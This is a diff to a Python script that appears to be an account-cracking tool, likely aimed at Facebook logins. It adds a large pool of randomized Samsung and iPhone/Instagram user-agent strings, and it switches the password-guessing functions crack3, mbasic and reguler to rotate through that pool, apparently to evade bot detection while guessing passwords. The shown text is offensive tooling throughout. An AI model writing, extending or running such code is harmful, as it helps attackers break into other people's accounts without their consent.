@@ -76,6 +76,7 @@ ngen=[]
 opsi=[]
 uidf=[]
 free=[]
+raka=[]
 liu=[]
 ugent = []
 licenseKey=[]
@@ -106,9 +107,20 @@ for i in range(200):
 	N = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
 	G = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-G973F/G973FXXSEFUL1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
 	rudalt= random.choice([S,A,M,S,U,N,G])
-	free.append(rudalt)
+	ugen.append(rudalt)
 
-
+for khontol in range(9999):
+    rc = random.choice; rr = random.randint
+    android_versi = str(rr(5,13))
+    chrome_versi = f"{str(rr(40,113))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"
+    instagram_versi = f"{str(rr(100,299))}.0.0.{str(rr(10,99))}.{str(rr(10,599))}"
+    kyu1 = f'Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36'
+    ua_aink=(f'{kyu1}')
+    raka.append(ua_aink)
+    kyu2 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(6,16))}_{str(rr(2,7))}_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(4,14))}.0 Mobile/{str(rr(10,20))}E{str(rr(000,199))} Safari/604.1 EdgiOS/{str(rr(40,113))}.0.0.0 Instagram/{instagram_versi}'
+    ua_aink=(f'{kyu2}')
+    raka.append(ua_aink)
+	
 for xd in range(10000):
     rr = random.randint; rc = random.choice
     aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
@@ -1307,7 +1319,7 @@ def crack3(idf,pwv):
     global loop,ok,cp
     prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
-    ua = random.choice(free)
+    ua = random.choice(raka)
     ua2 = random.choice(free)
     ses = requests.Session()
     for pw in pwv:
@@ -1369,7 +1381,7 @@ def mbasic(idf,pwv):
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(free)
+	ua=random.choice(raka)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1404,7 +1416,7 @@ def reguler(idf,pwv):
 	rr = random.randint
 	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(free)
+	ua=random.choice(raka)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
